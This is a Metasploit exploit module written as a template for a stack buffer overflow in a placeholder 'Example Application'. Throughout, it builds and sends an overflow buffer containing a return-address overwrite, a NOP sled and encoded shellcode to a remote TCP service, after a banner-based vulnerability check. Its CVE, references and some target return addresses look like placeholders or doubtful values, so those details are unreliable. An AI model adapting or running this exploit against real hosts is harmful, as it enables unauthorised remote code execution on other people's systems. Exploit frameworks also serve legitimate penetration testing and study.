##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Example Application Buffer Overflow Exploit',
        'Description' => %q{
          This module exploits a stack-based buffer overflow vulnerability in an
          example application. The vulnerability occurs when the application fails
          to properly validate user input before copying it to a fixed-size buffer
          on the stack. By sending a specially crafted request containing more data
          than the buffer can hold, an attacker can overwrite the saved return address
          on the stack and redirect program execution to arbitrary code.

          This exploit constructs a buffer that includes junk data to fill the buffer,
          a carefully chosen return address to redirect execution, a NOP sled to improve
          reliability, and the actual payload shellcode. When the vulnerable function
          returns, it jumps to the attacker-controlled address and executes the payload.

          The module supports multiple target configurations with different return
          addresses and offsets to accommodate various versions and operating system
          configurations of the vulnerable application.
        },
        'Author' => [
          'Original Researcher',
          'Exploit Developer',
          'Metasploit Module Author'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-12345'],
          ['BID', '98765'],
          ['URL', 'https://example.com/advisory/2024-001'],
          ['URL', 'https://example.com/blog/buffer-overflow-analysis']
        ],
        'Privileged' => true,
        'DefaultOptions' => {
          'EXITFUNC' => 'thread',
          'WfsDelay' => 5
        },
        'Payload' => {
          'Space' => 800,
          'BadChars' => "\x00\x0a\x0d\x20",
          'StackAdjustment' => -3500
        },
        'Platform' => ['win', 'linux'],
        'Targets' => [
          [
            'Windows XP SP3 English',
            {
              'Ret' => 0x7c874413,        # JMP ESP from user32.dll
              'Offset' => 2048,
              'Platform' => 'win'
            }
          ],
          [
            'Windows 7 SP1 English',
            {
              'Ret' => 0x625011af,        # JMP ESP from msvcrt.dll
              'Offset' => 2048,
              'Platform' => 'win'
            }
          ],
          [
            'Linux Ubuntu 18.04',
            {
              'Ret' => 0xbffff7a0,        # Return address on stack
              'Offset' => 2064,
              'Platform' => 'linux'
            }
          ],
          [
            'Windows 10 Build 1809',
            {
              'Ret' => 0x62501203,        # JMP ESP from system library
              'Offset' => 2056,
              'Platform' => 'win'
            }
          ]
        ],
        'DisclosureDate' => '2024-01-15',
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        Opt::RPORT(9999)
      ]
    )

    register_advanced_options(
      [
        OptInt.new('OFFSET', [false, 'Override the buffer offset value', nil]),
        OptInt.new('PAYLOAD_OFFSET', [false, 'Additional offset for payload placement', 0]),
        OptInt.new('NOP_SLED_SIZE', [false, 'Size of the NOP sled', 16]),
        OptBool.new('PREPEND_JUNK', [false, 'Prepend additional junk data', false])
      ]
    )
  end

  def check
    # Attempt to detect vulnerable version by banner grabbing
    begin
      connect
      sock.put("VERSION\r\n")
      res = sock.get_once(-1, 5)
      disconnect

      if res.nil?
        return Exploit::CheckCode::Unknown
      end

      # Check for vulnerable version string
      if res =~ /Example Application v([\d\.]+)/
        version = ::Regexp.last_match(1)
        print_status("Detected version: #{version}")

        # Versions 1.0 through 2.5 are vulnerable
        if version >= '1.0' && version <= '2.5'
          return Exploit::CheckCode::Appears
        else
          return Exploit::CheckCode::Safe
        end
      end

      return Exploit::CheckCode::Detected
    rescue Rex::ConnectionError, Rex::ConnectionRefused
      return Exploit::CheckCode::Unknown
    end
  end

  def exploit
    # Calculate offset - use datastore override if provided
    offset = datastore['OFFSET'] || target['Offset']
    
    print_status("Building exploit buffer for target: #{target.name}")
    print_status("Using offset: #{offset}")
    print_status("Using return address: 0x#{target.ret.to_s(16)}")

    # Generate the exploit buffer
    buffer = ''

    # Add optional prepended junk data if configured
    if datastore['PREPEND_JUNK']
      buffer << rand_text_alpha(100)
      print_status("Prepended 100 bytes of junk data")
    end

    # Part 1: Junk data to fill the buffer up to the return address
    # Using a cyclic pattern for debugging purposes can help identify exact offset
    junk_size = offset - buffer.length
    buffer << make_nops(junk_size)
    print_status("Added #{junk_size} bytes of junk data to reach return address")

    # Part 2: Overwrite the saved return address
    # This address will be loaded into EIP/RIP when the function returns
    buffer << [target.ret].pack('V')
    print_status("Overwrote return address with: 0x#{target.ret.to_s(16)}")

    # Part 3: NOP sled to increase reliability
    # Provides a landing zone in case our return address is slightly off
    nop_size = datastore['NOP_SLED_SIZE'] || 16
    buffer << make_nops(nop_size)
    print_status("Added #{nop_size} byte NOP sled")

    # Part 4: The actual payload shellcode
    # Apply any additional payload offset if specified
    if datastore['PAYLOAD_OFFSET'] > 0
      buffer << make_nops(datastore['PAYLOAD_OFFSET'])
      print_status("Added payload offset: #{datastore['PAYLOAD_OFFSET']} bytes")
    end

    # Encode and embed the payload
    buffer << payload.encoded
    print_status("Payload size: #{payload.encoded.length} bytes")

    # Part 5: Padding to ensure consistent buffer size (optional)
    # Some exploits need consistent total length
    if buffer.length < 4096
      padding_size = 4096 - buffer.length
      buffer << rand_text_alpha(padding_size)
    end

    print_status("Total exploit buffer size: #{buffer.length} bytes")

    # Send the exploit
    begin
      print_status("Connecting to #{rhost}:#{rport}...")
      connect

      # Some applications may require a specific protocol sequence
      # Adjust this section based on the target application's protocol
      print_status("Sending exploit buffer...")
      sock.put(buffer)

      # Wait for the payload to execute
      print_status("Waiting for payload execution...")
      sleep(datastore['WfsDelay'])

      # Disconnect after sending
      handler
      disconnect

      print_good("Exploit sent successfully!")
    rescue Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, "Connection failed: #{e.message}")
    rescue Rex::AddressInUse => e
      fail_with(Failure::BadConfig, "Address in use: #{e.message}")
    rescue ::Timeout::Error => e
      fail_with(Failure::TimeoutExpired, "Timeout: #{e.message}")
    rescue ::Exception => e
      fail_with(Failure::Unknown, "Exploit failed: #{e.class} - #{e.message}")
    end
  end
end